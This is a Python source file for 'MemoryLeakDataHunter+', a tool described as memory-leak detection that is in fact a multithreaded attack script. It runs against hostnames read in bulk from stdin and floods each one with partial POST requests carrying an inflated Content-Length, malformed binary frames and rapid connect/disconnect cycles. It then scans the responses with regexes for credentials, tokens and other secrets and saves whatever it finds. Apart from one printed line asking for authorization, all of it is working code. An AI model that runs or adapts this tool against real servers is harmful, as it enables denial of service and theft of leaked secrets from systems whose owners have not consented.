#!/usr/bin/env python3
"""
MemoryLeakDataHunter+ - Enhanced memory leak detection with YAML patterns
Author: Security Researcher
Date: 2023-10-15
Version: 3.0
"""

import os
import sys
import time
import socket
import threading
import argparse
import random
import binascii
import re
import yaml
import base64
from datetime import datetime
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init(autoreset=True)

# ASCII Banner with color
BANNER = f"""{Fore.CYAN}
  __  __      _             __  __          _      _   _             _            
 |  \\/  | ___| |_ ___ _ __ |  \\/  | ___  __| | ___| | | | ___   __ _| | _____ _ __ 
 | |\\/| |/ _ \\ __/ _ \\ '_ \\| |\\/| |/ _ \\/ _` |/ _ \\ |_| |/ _ \\ / _` | |/ / _ \\ '__|
 | |  | |  __/ ||  __/ |_) | |  | |  __/ (_| |  __/  _  | (_) | (_| |   <  __/ |   
 |_|  |_|\\___|\\__\\___| .__/|_|  |_|\\___|\\__,_|\\___|_| |_|\\___/ \\__,_|_|\\_\\___|_|   
                     |_| {Fore.YELLOW}(YAML Config Edition){Style.RESET_ALL}                                                         
"""

def load_patterns(config_path="leak_patterns.yaml"):
    """Load leak detection patterns from YAML file"""
    default_patterns = [
        {
            'name': "UUID",
            'regex': "[a-fA-F0-9]{8,}-[a-fA-F0-9]{4,}-[a-fA-F0-9]{4,}-[a-fA-F0-9]{4,}-[a-fA-F0-9]{12}",
            'color': "MAGENTA"
        },
        {
            'name': "C-String",
            'regex': "\\x00[\\x20-\\x7F]{20,}\\x00",
            'color': "BLUE"
        },
        {
            'name': "ELF Header",
            'regex': "\\x7FELF\\x02\\x01\\x01",
            'color': "CYAN"
        },
        {
            'name': "Redis Key",
            'regex': "[a-f0-9]{32}:[a-f0-9]{32}",
            'color': "YELLOW"
        },
        {
            'name': "Hex Dump",
            'regex': "[0-9a-fA-F]{32,}",
            'color': "GREEN"
        },
        {
            'name': "IP Address",
            'regex': "(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)",
            'color': "RED"
        },
        {
            'name': "Base64",
            'regex': "(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?",
            'color': "WHITE"
        },
        {
            'name': "Credentials",
            'regex': "(?:username|password|token|secret|key|auth)=[^\\s&]+",
            'color': "RED"
        }
    ]
    
    # Create default config if not exists
    if not os.path.exists(config_path):
        print(f"{Fore.YELLOW}[*] Creating default pattern file: {config_path}{Style.RESET_ALL}")
        with open(config_path, 'w') as f:
            yaml.dump({'patterns': default_patterns}, f, default_flow_style=False)
        return default_patterns
    
    # Load from YAML
    try:
        with open(config_path, 'r') as f:
            config = yaml.safe_load(f)
            return config.get('patterns', default_patterns)
    except Exception as e:
        print(f"{Fore.RED}[!] Error loading patterns: {e}. Using defaults{Style.RESET_ALL}")
        return default_patterns

def compile_patterns(patterns):
    """Compile regex patterns with proper byte encoding"""
    compiled = []
    for p in patterns:
        try:
            # Convert regex string to bytes pattern
            pattern_bytes = p['regex'].encode('latin-1').decode('unicode_escape').encode('latin-1')
            regex = re.compile(pattern_bytes)
            color = getattr(Fore, p.get('color', 'WHITE'))
            compiled.append((regex, p['name'], color))
        except Exception as e:
            print(f"{Fore.RED}[!] Error compiling pattern {p['name']}: {e}{Style.RESET_ALL}")
    return compiled

class MemoryLeakHunter:
    def __init__(self, target, port=80, duration=300, threads=30):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.leaked_data = []
        self.unique_leaks = set()
        self.test_running = True
        self.start_time = time.time()
        self.attack_counter = 0
        self.leak_counter = 0
        self.lock = threading.Lock()
        self.leak_patterns = compile_patterns(load_patterns())
        
    def print_status(self):
        """Print real-time test status with color"""
        elapsed = int(time.time() - self.start_time)
        attacks = f"{Fore.CYAN}{self.attack_counter}{Style.RESET_ALL}"
        leaks = f"{Fore.GREEN}{self.leak_counter}{Style.RESET_ALL}"
        unique = f"{Fore.YELLOW}{len(self.unique_leaks)}{Style.RESET_ALL}"
        
        print(f"\r{Fore.YELLOW}[⏱]{Style.RESET_ALL} Test running: {elapsed}/{self.duration}s | "
              f"Attacks: {attacks} | "
              f"Leaks found: {leaks} | "
              f"Unique leaks: {unique}", 
              end='', flush=True)
    
    def capture_leaked_data(self, response):
        """Capture and analyze potential leaked memory data"""
        if not response:
            return
        
        # Check for known memory leak patterns
        for pattern, leak_type, color in self.leak_patterns:
            matches = pattern.findall(response)
            if matches:
                with self.lock:
                    for match in matches:
                        # Skip small matches
                        if len(match) < 16:
                            continue
                            
                        # Add to unique leaks set
                        if match not in self.unique_leaks:
                            self.unique_leaks.add(match)
                            self.leaked_data.append({
                                'timestamp': datetime.now().isoformat(),
                                'data': match,
                                'type': leak_type,
                                'color': color
                            })
                            self.leak_counter += 1
    
    def partial_request_attack(self):
        """Send incomplete requests with large Content-Length"""
        try:
            s = socket.create_connection((self.target, self.port), timeout=3)
            
            # Build malicious request
            payload = (
                f"POST /leak-test-{random.randint(1000,9999)} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Length: 1000000\r\n"
                f"Connection: keep-alive\r\n"
                f"X-Test-Id: {binascii.hexlify(os.urandom(8)).decode()}\r\n\r\n"
                "A" * random.randint(10, 100)  # Partial body
            ).encode()
            
            s.send(payload)
            
            # Read partial response
            response = s.recv(4096)
            s.close()
            
            # Capture potential leaks
            self.capture_leaked_data(response)
            
            with self.lock:
                self.attack_counter += 1
        except:
            pass
    
    def malformed_packet_attack(self):
        """Send invalid protocol frames with garbage data"""
        try:
            s = socket.create_connection((self.target, self.port), timeout=3)
            
            # Create malformed packet with binary garbage
            garbage = bytes(random.getrandbits(8) for _ in range(128))
            payload = (
                b"\x00\x0a\x0d\xff"  # Binary garbage header
                b"GET / HTTP/1.1\r\n"
                b"Host: " + self.target.encode() + b"\r\n"
                b"X-Malformed: " + garbage + b"\r\n\r\n"
            )
            
            s.send(payload)
            
            # Read response
            response = s.recv(4096)
            s.close()
            
            # Capture potential leaks
            self.capture_leaked_data(response)
            
            with self.lock:
                self.attack_counter += 1
        except:
            pass
    
    def tcp_flood_attack(self):
        """Rapid connect/disconnect with minimal data"""
        try:
            s = socket.create_connection((self.target, self.port), timeout=1)
            
            # Send partial request and disconnect immediately
            payload = (
                b"GET / HTTP/1.1\r\n"
                b"Host: " + self.target.encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"X-Flood: " + binascii.hexlify(os.urandom(16)) + b"\r\n"
            )
            s.send(payload)
            
            # Attempt to read response
            try:
                response = s.recv(1024)
                self.capture_leaked_data(response)
            except:
                pass
                
            s.close()
            
            with self.lock:
                self.attack_counter += 1
        except:
            pass
    
    def execute_attacks(self):
        """Execute various protocol attacks in a loop"""
        attack_functions = [
            self.partial_request_attack,
            self.malformed_packet_attack,
            self.tcp_flood_attack
        ]
        
        while self.test_running:
            # Randomly select an attack method
            attack_func = random.choice(attack_functions)
            attack_func()
            
            # Add small delay between attacks
            time.sleep(random.uniform(0.01, 0.1))
    
    def save_leaked_data(self):
        """Save captured leaked data to files"""
        if not self.leaked_data:
            print(f"{Fore.YELLOW}[!] No leaked data captured for {self.target}{Style.RESET_ALL}")
            return None
            
        # Create output directory
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_dir = f"leak_data_{self.target}_{timestamp}"
        os.makedirs(output_dir, exist_ok=True)
        
        # Save raw leaked data
        with open(f"{output_dir}/raw_leaks.bin", "wb") as f:
            for leak in self.leaked_data:
                f.write(leak['data'])
                f.write(b"\n---\n")
        
        # Save decoded leaks
        with open(f"{output_dir}/decoded_leaks.txt", "w", errors="ignore") as f:
            for i, leak in enumerate(self.leaked_data):
                f.write(f"--- Leak #{i+1} ({leak['type']}) at {leak['timestamp']} ---\n")
                try:
                    # Try UTF-8 decoding
                    decoded = leak['data'].decode('utf-8', 'ignore')
                    f.write(decoded + "\n\n")
                except:
                    # Fallback to hex representation
                    hex_data = binascii.hexlify(leak['data']).decode('ascii')
                    f.write(hex_data + "\n\n")
        
        # Save hexdump view
        with open(f"{output_dir}/hex_view.txt", "w") as f:
            for i, leak in enumerate(self.leaked_data):
                f.write(f"--- Leak #{i+1} ({leak['type']}) at {leak['timestamp']} ---\n")
                hexdump = binascii.hexlify(leak['data']).decode('ascii')
                # Format hexdump for readability
                formatted = ' '.join(hexdump[j:j+2] for j in range(0, len(hexdump), 2))
                f.write(formatted + "\n\n")
        
        # Save pattern info
        with open(f"{output_dir}/patterns_used.yaml", "w") as f:
            pattern_info = []
            for pattern, name, color in self.leak_patterns:
                pattern_info.append({
                    'name': name,
                    'regex': pattern.pattern.decode('latin-1', 'ignore'),
                    'color': color.name
                })
            yaml.dump({'patterns': pattern_info}, f)
        
        print(f"{Fore.GREEN}[+] Saved {len(self.leaked_data)} leaks to {output_dir}/{Style.RESET_ALL}")
        return output_dir
    
    def print_leaked_data(self):
        """Print captured leaked data to console with color coding"""
        if not self.leaked_data:
            print(f"{Fore.YELLOW}[!] No leaked data captured for {self.target}{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}[+] Captured Leaked Data for {self.target}:{Style.RESET_ALL}")
        for i, leak in enumerate(self.leaked_data[:5]):  # Show first 5 leaks
            color = leak.get('color', Fore.WHITE)
            leak_type = leak['type']
            timestamp = leak['timestamp']
            
            print(f"\n{Fore.YELLOW}--- Leak #{i+1} ({leak_type}) at {timestamp} ---{Style.RESET_ALL}")
            try:
                # Try UTF-8 decoding
                decoded = leak['data'].decode('utf-8', 'ignore')
                # Highlight credentials in red
                if leak_type == "Credentials":
                    decoded = re.sub(r'(username|password|token|secret|key|auth)=([^\s&]+)', 
                                    f'{Fore.RED}\\1=\\2{Style.RESET_ALL}', 
                                    decoded)
                print(f"{color}{decoded[:512]}{Style.RESET_ALL}")  # Print first 512 characters
            except:
                # Fallback to hex representation
                hex_data = binascii.hexlify(leak['data']).decode('ascii')
                print(f"{color}{hex_data[:128]}...{Style.RESET_ALL}")  # Print first 128 hex chars
        
        if len(self.leaked_data) > 5:
            print(f"\n{Fore.CYAN}[+] ... and {len(self.leaked_data) - 5} more leaks (saved to disk){Style.RESET_ALL}")
    
    def run_test(self):
        """Run the memory leak detection test for a single target"""
        print(f"{Fore.CYAN}\n[+] Starting memory leak data capture against {self.target}:{self.port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Test duration: {self.duration} seconds{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using {self.threads} threads{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] WARNING: This tool may trigger security alerts. Use only on authorized systems!{Style.RESET_ALL}")
        
        # Start attack threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.execute_attacks)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Run for specified duration
        try:
            while time.time() - self.start_time < self.duration:
                time.sleep(1)
                self.print_status()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Test stopped by user{Style.RESET_ALL}")
        
        # Cleanup
        self.test_running = False
        time.sleep(2)  # Allow threads to finish
        
        # Save and display results
        output_dir = self.save_leaked_data()
        self.print_leaked_data()
        
        print(f"{Fore.GREEN}[+] Test complete for {self.target}{Style.RESET_ALL}")
        return output_dir


def main():
    parser = argparse.ArgumentParser(description="MemoryLeakDataHunter+ - Enhanced memory leak detection")
    parser.add_argument("-t", "--target", help="Single target hostname or IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-d", "--duration", type=int, default=300, 
                        help="Test duration in seconds (default: 300 = 5 minutes)")
    parser.add_argument("-T", "--threads", type=int, default=30, 
                        help="Number of attack threads per target (default: 30)")
    parser.add_argument("-o", "--output", help="Base output directory for all results")
    parser.add_argument("-c", "--config", default="leak_patterns.yaml", 
                        help="Path to pattern configuration file")
    
    args = parser.parse_args()
    
    print(BANNER)
    
    # Load patterns once at start
    global_patterns = load_patterns(args.config)
    print(f"{Fore.GREEN}[+] Loaded {len(global_patterns)} detection patterns from {args.config}{Style.RESET_ALL}")
    
    # Determine targets
    targets = []
    if args.target:
        targets.append(args.target)
    
    # Read from stdin if piped input
    if not sys.stdin.isatty():
        print(f"{Fore.CYAN}[+] Reading targets from stdin...{Style.RESET_ALL}")
        for line in sys.stdin:
            target = line.strip()
            if target:
                targets.append(target)
    
    if not targets:
        print(f"{Fore.RED}[!] Error: No targets provided. Either use --target or pipe targets via stdin{Style.RESET_ALL}")
        parser.print_help()
        sys.exit(1)
    
    print(f"{Fore.GREEN}[+] Found {len(targets)} targets to test{Style.RESET_ALL}")
    
    # Create base output directory if specified
    base_output = args.output or "leak_reports"
    os.makedirs(base_output, exist_ok=True)
    
    # Test each target
    results = {}
    for i, target in enumerate(targets):
        print(f"\n{Fore.YELLOW}=== [ Target {i+1}/{len(targets)}: {target} ] ==={Style.RESET_ALL}")
        
        # Create hunter instance
        hunter = MemoryLeakHunter(
            target=target,
            port=args.port,
            duration=args.duration,
            threads=args.threads
        )
        
        # Run test and capture results
        output_dir = hunter.run_test()
        
        if output_dir:
            # Move results to base directory
            new_path = os.path.join(base_output, os.path.basename(output_dir))
            os.rename(output_dir, new_path)
            results[target] = new_path
    
    # Print final summary
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{' TEST SUMMARY ':-^50}{Style.RESET_ALL}")
    for target, path in results.items():
        print(f"{Fore.YELLOW}• {target}: {Fore.CYAN}{path}{Style.RESET_ALL}")
    
    if not results:
        print(f"{Fore.YELLOW}No leaks found in any targets{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] All tests completed. Results saved to: {base_output}/{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
